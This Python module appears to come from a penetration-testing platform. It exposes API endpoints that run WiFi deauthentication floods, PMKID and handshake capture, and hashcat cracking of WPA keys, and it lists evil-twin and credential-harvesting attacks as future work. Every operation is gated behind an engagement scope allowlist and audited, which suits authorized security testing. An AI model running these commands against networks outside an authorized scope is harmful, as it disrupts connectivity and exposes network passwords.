"""Offensive WiFi — active attacks against IN-SCOPE targets only.

GATED MODULE. Every offensive operation is double-gated:

  1. The module refuses to put the radio into monitor mode unless an engagement
     is active AND the target is inside the engagement scope allowlist — so a
     doomed request never even touches the card.
  2. Every subprocess is launched through ``warlock.jobs.runner.submit`` with
     ``requires_engagement=True``. That is the *authoritative* gate: it
       - refuses when engagement mode is OFF,
       - refuses any target not in the engagement scope allowlist,
       - writes a ``scope.violation`` audit row + fires an alert on refusal,
       - writes a ``job.submit`` audit row for every accepted invocation.

Wraps ``wlan1`` (MT7921 / mt7921u) in monitor mode for the attack tools and
restores it to managed on shutdown. The engagement kill switch
(``engagement.killswitch``) also cancels all jobs and restores interfaces.

MVP operations implemented in this slice:
  POST /api/wifi_offensive/deauth      aireplay-ng --deauth vs an in-scope AP
  POST /api/wifi_offensive/pmkid       hcxdumptool -> hcxpcapngtool -> .hc22000
  POST /api/wifi_offensive/handshake   deauth + EAPOL capture -> handshakes/
  POST /api/wifi_offensive/crack       hashcat vs a captured .hc22000 + wordlists/

Deferred (clear TODO stubs, return HTTP 501): evil-twin / captive portal,
karma / MANA, WPS (reaver/bully), WPA-Enterprise harvester (eaphammer).
See ``02-warlock-command-center.md`` (Module 6) for the full spec.
"""
from __future__ import annotations

import asyncio
import logging
import re
import shlex
import shutil
from datetime import datetime
from pathlib import Path
from typing import Any

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel, Field
from sqlalchemy import desc

from warlock.config import get_settings
from warlock.db import session_scope
from warlock.engagement import engagement
from warlock.jobs import runner
from warlock.models import Job
from warlock.modules._base import ModuleBase

log = logging.getLogger("warlock.wifi_offensive")

# --- tool paths (resolved at import; fall back to canonical install locations) ---
AIREPLAY = shutil.which("aireplay-ng") or "/usr/sbin/aireplay-ng"
AIRODUMP = shutil.which("airodump-ng") or "/usr/sbin/airodump-ng"
HCXDUMPTOOL = shutil.which("hcxdumptool") or "/usr/bin/hcxdumptool"
HCXPCAPNGTOOL = shutil.which("hcxpcapngtool") or "/usr/bin/hcxpcapngtool"
HASHCAT = shutil.which("hashcat") or "/usr/bin/hashcat"

MT_HELPER = shutil.which("wlan-mt7921") or "/usr/local/bin/wlan-mt7921"
WLAN_IFACE = "wlan1"  # managed-mode name of the MT7921 attack dongle
MON_IFACE = "mon0"    # monitor-mode name exposed by the helper

# hashcat mode for combined WPA*-PBKDF2 PMKID + EAPOL (.hc22000 hashline format).
HC22000_MODE = "22000"
CRACK_MODES = {"22000", "16800"}  # 16800 = legacy PMKID-only

_MAC_RE = re.compile(r"^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")


# --------------------------------------------------------------------------- #
# Data directories (under the operator data root, default ~/warlock)
# --------------------------------------------------------------------------- #
def _dir(*parts: str) -> Path:
    p = get_settings().data.joinpath(*parts)
    p.mkdir(parents=True, exist_ok=True)
    return p


def _captures_dir() -> Path:
    return _dir("captures", "wifi")


def _handshakes_dir() -> Path:
    return _dir("handshakes")


def _wordlists_dir() -> Path:
    return _dir("wordlists")


# --------------------------------------------------------------------------- #
# Validation / path-safety helpers
# --------------------------------------------------------------------------- #
def _norm_mac(value: str, field: str = "bssid") -> str:
    v = (value or "").strip().lower()
    if not _MAC_RE.match(v):
        raise HTTPException(400, f"invalid {field} MAC address: {value!r}")
    return v


def _contained(path: Path, root: Path) -> bool:
    """True if *path* resolves to a location inside *root* (blocks traversal)."""
    try:
        path.resolve().relative_to(root.resolve())
        return True
    except (ValueError, OSError, RuntimeError):
        return False


def _resolve_wordlist(name: str | None) -> Path:
    wdir = _wordlists_dir()
    if not name:
        for cand in ("rockyou.txt", "common-wpa-passwords.txt"):
            p = wdir / cand
            if p.exists():
                return p
        return wdir / "rockyou.txt"  # canonical default; existence checked at run time
    p = Path(name) if "/" in name else (wdir / name)
    if not _contained(p, wdir):
        raise HTTPException(400, f"wordlist must live under {wdir}")
    return p


# --------------------------------------------------------------------------- #
# Monitor-mode control (mirrors wifi_recon: prefer the MT7921 helper, fall back
# to `iw`). All offensive tools run against the monitor iface.
# --------------------------------------------------------------------------- #
async def _run_helper(action: str, timeout: float = 10.0) -> str:
    """Drive the MT7921 helper (monitor|managed), best-effort, falling back to
    ``iw dev <wlan1> set type ...``. Swallows errors so cleanup never raises.
    """
    have_helper = bool(shutil.which("wlan-mt7921")) or Path(MT_HELPER).exists()
    have_iface = Path(f"/sys/class/net/{WLAN_IFACE}").exists()
    if not have_helper and not have_iface:
        log.debug("no MT7921 helper or %s present; skipping '%s'", WLAN_IFACE, action)
        return ""

    out = ""
    if have_helper:
        try:
            proc = await asyncio.create_subprocess_exec(
                MT_HELPER, action,
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
            ob, eb = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            out = ((ob or b"") + (eb or b"")).decode("utf-8", errors="replace")
            if proc.returncode == 0:
                return out
        except Exception as e:  # noqa: BLE001
            log.warning("wlan-mt7921 %s failed: %s", action, e)

    iw_type = "monitor" if action == "monitor" else "managed"
    try:
        proc = await asyncio.create_subprocess_exec(
            "sudo", "-n", "iw", "dev", WLAN_IFACE, "set", "type", iw_type,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        ob, eb = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        out += ((ob or b"") + (eb or b"")).decode("utf-8", errors="replace")
    except Exception as e:  # noqa: BLE001
        log.warning("iw %s on %s failed: %s", iw_type, WLAN_IFACE, e)
    return out


async def _ensure_monitor() -> str:
    return await _run_helper("monitor")


async def _restore_managed() -> str:
    return await _run_helper("managed")


# --------------------------------------------------------------------------- #
# The single gated launch path. Every op goes through here.
# --------------------------------------------------------------------------- #
def _would_allow(target: str) -> bool:
    """Cheap, side-effect-free pre-check: would the authoritative gate accept?

    Used only to decide whether to touch the radio / write capture artifacts.
    The real gate is ``runner.submit(requires_engagement=True)``.
    """
    return engagement.is_on() and (not target or engagement.check_target(target))


async def _submit_gated(
    type_: str,
    argv: list[str],
    *,
    target: str,
    note: str,
    needs_monitor: bool = True,
) -> str:
    """Authoritative offensive launch path.

    Only flips the radio to monitor mode when the op would be allowed, then
    submits through the engagement-guarded runner. ``runner.submit`` is the
    single source of truth for the gate: on refusal it writes the
    ``scope.violation`` audit row, fires the alert, and raises ``PermissionError``
    (mapped here to HTTP 403). On success it persists the Job + a ``job.submit``
    audit row.
    """
    if needs_monitor and _would_allow(target):
        await _ensure_monitor()
    try:
        return await runner.submit(
            type_, argv, requires_engagement=True, target=target, note=note
        )
    except PermissionError as e:
        raise HTTPException(403, str(e)) from e


# --------------------------------------------------------------------------- #
# Pure command builders — every interpolated value is int-coerced and/or
# shlex.quoted. (Numerics that flow into the bash chains are a shell-injection
# surface; the scope allowlist only constrains the BSSID target.)
# --------------------------------------------------------------------------- #
def _deauth_command(
    *, bssid: str, client: str | None = None, count: int = 64, pps: int = 0,
    iface: str = MON_IFACE,
) -> list[str]:
    count = max(0, int(count))  # 0 == continuous burst
    argv = ["sudo", "-n", AIREPLAY, "--deauth", str(count), "-a", bssid]
    if client:
        argv += ["-c", client]
    if int(pps) > 0:
        argv += ["-x", str(int(pps))]  # injection rate (packets/sec)
    argv.append(iface)
    return argv


def _pmkid_command(
    *, bssid: str, filterfile: Path, pcapng: Path, hc22000: Path, duration: int = 60,
    iface: str = MON_IFACE, auto_crack: bool = False,
    wordlist: Path | None = None, potfile: Path | None = None,
) -> list[str]:
    duration = max(5, int(duration))
    q = shlex.quote
    capture = (
        f"timeout {duration} sudo -n {q(HCXDUMPTOOL)} -i {q(iface)} "
        f"-o {q(str(pcapng))} --filterlist_ap={q(str(filterfile))} "
        f"--filtermode=2 --enable_status=1"
    )
    convert = f"{q(HCXPCAPNGTOOL)} -o {q(str(hc22000))} {q(str(pcapng))}"
    script = f"{capture} ; {convert}"
    if auto_crack and wordlist is not None:
        pot = q(str(potfile)) if potfile is not None else q(str(hc22000) + ".pot")
        script += (
            f" ; {q(HASHCAT)} -m {HC22000_MODE} -a 0 {q(str(hc22000))} "
            f"{q(str(wordlist))} --potfile-path {pot} -w 3"
        )
    return ["bash", "-c", script]


def _handshake_command(
    *, bssid: str, channel: int, prefix: Path, client: str | None = None,
    duration: int = 90, deauth_count: int = 5, iface: str = MON_IFACE,
) -> list[str]:
    duration = max(10, int(duration))
    deauth_count = max(1, int(deauth_count))
    channel = int(channel)
    q = shlex.quote
    dump = (
        f"timeout {duration} sudo -n {q(AIRODUMP)} -c {channel} "
        f"--bssid {q(bssid)} -w {q(str(prefix))} --output-format pcap {q(iface)}"
    )
    deauth = f"sudo -n {q(AIREPLAY)} --deauth {deauth_count} -a {q(bssid)}"
    if client:
        deauth += f" -c {q(client)}"
    deauth += f" {q(iface)}"
    # Background the capture, give it a beat to lock channel, fire a deauth burst
    # to force the 4-way EAPOL re-handshake, then wait for the capture to finish.
    script = f"{dump} & DUMP=$!; sleep 5; {deauth}; wait $DUMP"
    return ["bash", "-c", script]


def _crack_command(
    *, hashfile: Path, wordlist: Path, mode: str = HC22000_MODE,
    potfile: Path | None = None, outfile: Path | None = None,
) -> list[str]:
    # Offline cracking — does NOT need root, so no sudo prefix.
    argv = [HASHCAT, "-m", str(mode), "-a", "0", str(hashfile), str(wordlist), "-w", "3"]
    if potfile is not None:
        argv += ["--potfile-path", str(potfile)]
    if outfile is not None:
        argv += ["-o", str(outfile)]
    return argv


# --------------------------------------------------------------------------- #
# Read helpers for /status, /captures, /jobs
# --------------------------------------------------------------------------- #
def _list_captures() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    seen: set[str] = set()
    for d in (_captures_dir(), _handshakes_dir()):
        for pattern in ("*.hc22000", "*.pcapng", "*.cap"):
            for p in sorted(d.glob(pattern)):
                if p.as_posix() in seen:
                    continue
                seen.add(p.as_posix())
                st = p.stat()
                out.append({
                    "path": p.as_posix(),
                    "filename": p.name,
                    "kind": p.suffix.lstrip("."),
                    "size_bytes": st.st_size,
                    "mtime": datetime.utcfromtimestamp(st.st_mtime).isoformat(),
                })
    out.sort(key=lambda c: c["mtime"], reverse=True)
    return out


def _list_wordlists() -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    for p in sorted(_wordlists_dir().glob("*")):
        if p.is_file():
            out.append({"filename": p.name, "path": p.as_posix(), "size_bytes": p.stat().st_size})
    return out


def _recent_jobs(limit: int = 20) -> list[dict[str, Any]]:
    with session_scope() as s:
        rows = (
            s.query(Job)
            .filter(Job.type.like("wifi.%"))
            .order_by(desc(Job.started_at))
            .limit(limit)
            .all()
        )
        return [{
            "id": j.id,
            "type": j.type,
            "status": j.status,
            "started_at": j.started_at.isoformat() if j.started_at else None,
            "finished_at": j.finished_at.isoformat() if j.finished_at else None,
            "engagement_id": j.engagement_id,
            "argv": j.argv,
        } for j in rows]


# --------------------------------------------------------------------------- #
# Request bodies
# --------------------------------------------------------------------------- #
class DeauthBody(BaseModel):
    bssid: str = Field(..., description="Target AP BSSID (must be in engagement scope)")
    client: str | None = Field(default=None, description="Optional client MAC to target")
    count: int = Field(default=64, ge=0, le=100_000, description="Deauth bursts (0 = continuous)")
    pps: int = Field(default=0, ge=0, le=10_000, description="Injection rate packets/sec (aireplay -x)")


class PmkidBody(BaseModel):
    bssid: str = Field(..., description="Target AP BSSID (must be in engagement scope)")
    duration: int = Field(default=60, ge=5, le=3600, description="Capture window seconds")
    auto_crack: bool = Field(default=False, description="Chain a hashcat crack after conversion")
    wordlist: str | None = Field(default=None, description="Wordlist filename under wordlists/")


class HandshakeBody(BaseModel):
    bssid: str = Field(..., description="Target AP BSSID (must be in engagement scope)")
    channel: int = Field(..., ge=1, le=196, description="AP channel")
    client: str | None = Field(default=None, description="Optional client MAC for targeted deauth")
    duration: int = Field(default=90, ge=10, le=3600, description="Capture window seconds")
    deauth_count: int = Field(default=5, ge=1, le=10_000, description="Deauth bursts to force EAPOL")


class CrackBody(BaseModel):
    hashfile: str = Field(..., description="Path to a captured .hc22000 under captures/ or handshakes/")
    wordlist: str | None = Field(default=None, description="Wordlist filename under wordlists/")
    mode: str = Field(default=HC22000_MODE, description="hashcat -m mode (22000 or 16800)")
    target: str | None = Field(default=None, description="BSSID/ESSID the hash belongs to (scope-checked)")


# --------------------------------------------------------------------------- #
# Module
# --------------------------------------------------------------------------- #
class Module(ModuleBase):
    id = "wifi_offensive"
    label = "Offensive WiFi"
    icon = "⚠"
    requires_engagement = True
    requires_root = True

    async def on_shutdown(self) -> None:
        try:
            await _restore_managed()
        except Exception:  # noqa: BLE001
            log.exception("wifi_offensive shutdown restore failed")

    def router(self) -> APIRouter:
        r = APIRouter(prefix=f"/api/{self.id}", tags=[self.id])

        @r.get("/status")
        def status() -> dict[str, Any]:
            return {
                "ok": True,
                "module": self.id,
                "label": self.label,
                "requires_engagement": self.requires_engagement,
                "engaged": engagement.is_on(),
                "engagement": engagement.status(),
                "iface": {"managed": WLAN_IFACE, "monitor": MON_IFACE},
                "ops": ["deauth", "pmkid", "handshake", "crack"],
                "deferred": TODO_ITEMS,
                "captures": _list_captures(),
                "wordlists": _list_wordlists(),
                "recent_jobs": _recent_jobs(limit=10),
            }

        @r.get("/captures")
        def captures() -> dict[str, Any]:
            caps = _list_captures()
            return {"ok": True, "captures": caps, "count": len(caps)}

        @r.get("/jobs")
        def jobs(limit: int = 50) -> dict[str, Any]:
            limit = max(1, min(500, int(limit)))
            rows = _recent_jobs(limit=limit)
            return {"ok": True, "jobs": rows, "count": len(rows)}

        # ----- MVP op 1: deauth -------------------------------------------- #
        @r.post("/deauth")
        async def deauth(body: DeauthBody) -> dict[str, Any]:
            bssid = _norm_mac(body.bssid, "bssid")
            client = _norm_mac(body.client, "client") if body.client else None
            argv = _deauth_command(bssid=bssid, client=client, count=body.count, pps=body.pps)
            job_id = await _submit_gated(
                "wifi.deauth", argv, target=bssid,
                note=f"deauth ap={bssid} client={client or '*'} count={body.count}",
            )
            return {"ok": True, "op": "deauth", "job_id": job_id, "target": bssid, "argv": argv}

        # ----- MVP op 2: PMKID capture ------------------------------------- #
        @r.post("/pmkid")
        async def pmkid(body: PmkidBody) -> dict[str, Any]:
            bssid = _norm_mac(body.bssid, "bssid")
            stamp = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
            base = bssid.replace(":", "")
            cdir = _captures_dir()
            pcapng = cdir / f"pmkid-{base}-{stamp}.pcapng"
            hc22000 = cdir / f"pmkid-{base}-{stamp}.hc22000"
            filterfile = cdir / f"pmkid-{base}-{stamp}.filter"
            potfile = cdir / "wifi.potfile"
            wordlist = _resolve_wordlist(body.wordlist) if body.auto_crack else None
            # Only materialise the hcxdumptool filterlist for an allowed op.
            if _would_allow(bssid):
                filterfile.write_text(f"{bssid}\n")
            argv = _pmkid_command(
                bssid=bssid, filterfile=filterfile, pcapng=pcapng, hc22000=hc22000,
                duration=body.duration, auto_crack=body.auto_crack,
                wordlist=wordlist, potfile=potfile,
            )
            job_id = await _submit_gated(
                "wifi.pmkid", argv, target=bssid,
                note=f"pmkid ap={bssid} dur={body.duration}s auto_crack={body.auto_crack}",
            )
            return {
                "ok": True, "op": "pmkid", "job_id": job_id, "target": bssid,
                "pcapng": pcapng.as_posix(), "hc22000": hc22000.as_posix(),
                "auto_crack": body.auto_crack, "argv": argv,
            }

        # ----- MVP op 3: handshake forcer ---------------------------------- #
        @r.post("/handshake")
        async def handshake(body: HandshakeBody) -> dict[str, Any]:
            bssid = _norm_mac(body.bssid, "bssid")
            client = _norm_mac(body.client, "client") if body.client else None
            stamp = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
            base = bssid.replace(":", "")
            prefix = _handshakes_dir() / f"hs-{base}-{stamp}"
            argv = _handshake_command(
                bssid=bssid, channel=body.channel, prefix=prefix, client=client,
                duration=body.duration, deauth_count=body.deauth_count,
            )
            job_id = await _submit_gated(
                "wifi.handshake", argv, target=bssid,
                note=f"handshake ap={bssid} ch={body.channel} dur={body.duration}s",
            )
            return {
                "ok": True, "op": "handshake", "job_id": job_id, "target": bssid,
                "prefix": prefix.as_posix(), "argv": argv,
            }

        # ----- MVP op 4: crack queue --------------------------------------- #
        @r.post("/crack")
        async def crack(body: CrackBody) -> dict[str, Any]:
            if body.mode not in CRACK_MODES:
                raise HTTPException(400, f"unsupported hashcat mode {body.mode!r}; choose {sorted(CRACK_MODES)}")
            hashpath = Path(body.hashfile)
            if not (_contained(hashpath, _captures_dir()) or _contained(hashpath, _handshakes_dir())):
                raise HTTPException(400, "hashfile must live under the captures/ or handshakes/ data dirs")
            wordlist = _resolve_wordlist(body.wordlist)
            potfile = _captures_dir() / "wifi.potfile"
            outfile = _captures_dir() / f"{hashpath.stem}.cracked"
            # Cracking is offline; the natural scope target is the source network.
            raw_target = (body.target or "").strip()
            target = _norm_mac(raw_target, "target") if _MAC_RE.match(raw_target) else raw_target
            argv = _crack_command(
                hashfile=hashpath, wordlist=wordlist, mode=body.mode,
                potfile=potfile, outfile=outfile,
            )
            job_id = await _submit_gated(
                "wifi.crack", argv, target=target,
                note=f"crack {hashpath.name} wordlist={wordlist.name} mode={body.mode}",
                needs_monitor=False,  # offline — never flips the radio
            )
            return {
                "ok": True, "op": "crack", "job_id": job_id, "target": target,
                "hashfile": hashpath.as_posix(), "wordlist": wordlist.as_posix(),
                "outfile": outfile.as_posix(), "argv": argv,
            }

        # ----- Deferred ops: clear 501 stubs (still engagement-gated module) #
        # TODO(wave-2+): implement these. When built they MUST route through
        # ``_submit_gated`` exactly like the MVP ops above so the engagement
        # gate + audit trail apply uniformly.
        #   - Evil Twin + captive portal (hostapd-mana + dnsmasq + portal)
        #   - Karma / MANA (hostapd-mana PineAP-style probe response)
        #   - WPS attacks (reaver / bully)
        #   - WPA-Enterprise harvester (eaphammer, EAP-MSCHAPv2 capture)
        @r.post("/evil_twin")
        def evil_twin() -> dict[str, Any]:
            raise HTTPException(501, "evil-twin / captive portal not implemented in MVP (deferred)")

        @r.post("/karma")
        def karma() -> dict[str, Any]:
            raise HTTPException(501, "karma / MANA not implemented in MVP (deferred)")

        @r.post("/wps")
        def wps() -> dict[str, Any]:
            raise HTTPException(501, "WPS (reaver/bully) not implemented in MVP (deferred)")

        @r.post("/eaphammer")
        def eaphammer() -> dict[str, Any]:
            raise HTTPException(501, "WPA-Enterprise harvester (eaphammer) not implemented in MVP (deferred)")

        return r


TODO_ITEMS: list[str] = [
    "Evil Twin + captive portal templates (hostapd-mana + dnsmasq)",
    "Karma / MANA probe-response (hostapd-mana)",
    "WPS attacks (reaver / bully)",
    "WPA-Enterprise harvester (eaphammer, EAP-MSCHAPv2 capture)",
    "Auto-enqueue crack on capture completion (job-completion wiring)",
]
